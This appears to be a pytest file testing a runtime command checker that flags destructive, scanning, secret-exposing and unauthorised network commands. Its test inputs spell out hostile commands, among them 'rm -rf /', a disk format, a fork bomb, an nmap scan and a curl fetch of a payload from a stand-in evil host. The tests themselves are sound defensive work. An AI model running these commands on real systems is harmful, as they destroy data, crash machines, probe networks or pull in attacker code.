"""Tests for the constitutional enforcer — deterministic runtime constraint checker."""

from __future__ import annotations

import pytest

from cohezion.security.constitutional_enforcer import (
    ConstitutionalEnforcer,
    Violation,
    ViolationType,
)


@pytest.mark.unit
def test_safe_command_passes() -> None:
    enforcer = ConstitutionalEnforcer()
    assert enforcer.check("ls -la") == []
    assert enforcer.check("git status") == []
    assert enforcer.check("uv run pytest tests/ -q") == []


@pytest.mark.unit
def test_rm_rf_root_blocked() -> None:
    enforcer = ConstitutionalEnforcer()
    violations = enforcer.check("rm -rf /")
    assert len(violations) == 1
    assert violations[0].violation_type == ViolationType.DESTRUCTIVE_COMMAND


@pytest.mark.unit
def test_rm_rf_subdir_allowed() -> None:
    enforcer = ConstitutionalEnforcer()
    # /tmp/build has a word character after the slash — must not be blocked
    violations = enforcer.check("rm -rf /tmp/build")
    assert violations == []


@pytest.mark.unit
def test_mkfs_blocked() -> None:
    enforcer = ConstitutionalEnforcer()
    violations = enforcer.check("mkfs.ext4 /dev/sda1")
    assert len(violations) >= 1
    types = {v.violation_type for v in violations}
    assert ViolationType.DESTRUCTIVE_COMMAND in types


@pytest.mark.unit
def test_fork_bomb_blocked() -> None:
    enforcer = ConstitutionalEnforcer()
    # Classic fork bomb
    violations = enforcer.check(":(){ :|:& };:")
    assert len(violations) >= 1
    types = {v.violation_type for v in violations}
    assert ViolationType.DESTRUCTIVE_COMMAND in types


@pytest.mark.unit
def test_nmap_blocked() -> None:
    enforcer = ConstitutionalEnforcer()
    violations = enforcer.check("nmap 192.168.1.1")
    assert len(violations) >= 1
    types = {v.violation_type for v in violations}
    assert ViolationType.INFRASTRUCTURE_ATTACK in types


@pytest.mark.unit
def test_password_print_blocked() -> None:
    enforcer = ConstitutionalEnforcer()
    violations = enforcer.check("print(password)")
    assert len(violations) >= 1
    types = {v.violation_type for v in violations}
    assert ViolationType.SECRET_EXPOSURE in types


@pytest.mark.unit
def test_is_safe_true_for_clean() -> None:
    enforcer = ConstitutionalEnforcer()
    assert enforcer.is_safe("echo hello world") is True
    assert enforcer.is_safe("python -m pytest") is True


@pytest.mark.unit
def test_is_safe_false_for_violation() -> None:
    enforcer = ConstitutionalEnforcer()
    assert enforcer.is_safe("rm -rf /") is False
    assert enforcer.is_safe("nmap 10.0.0.1") is False


@pytest.mark.unit
def test_enforce_raises_on_violation() -> None:
    enforcer = ConstitutionalEnforcer()
    with pytest.raises(ValueError, match="Constitutional violation"):
        enforcer.enforce("rm -rf /")


@pytest.mark.unit
def test_enforce_passes_clean_input() -> None:
    enforcer = ConstitutionalEnforcer()
    # Should not raise
    enforcer.enforce("git log --oneline -10")


@pytest.mark.unit
def test_extra_patterns() -> None:
    enforcer = ConstitutionalEnforcer(extra_patterns=[(ViolationType.UNAUTHORIZED_NETWORK, r"curl\s+http://evil\.com")])
    violations = enforcer.check("curl http://evil.com/payload")
    assert len(violations) >= 1
    types = {v.violation_type for v in violations}
    assert ViolationType.UNAUTHORIZED_NETWORK in types
    # Standard patterns still active
    assert enforcer.is_safe("nmap 10.0.0.1") is False


@pytest.mark.unit
def test_violation_is_frozen() -> None:
    violation = Violation(
        violation_type=ViolationType.DESTRUCTIVE_COMMAND,
        pattern_matched=r"rm\s+-rf\s+/(?!\w)",
        input_text="rm -rf /",
        description="destructive_command: matched pattern 'rm\\s+-rf\\s+/(?!\\w)'",
    )
    with pytest.raises((AttributeError, TypeError)):
        violation.violation_type = ViolationType.SECRET_EXPOSURE  # type: ignore[misc]
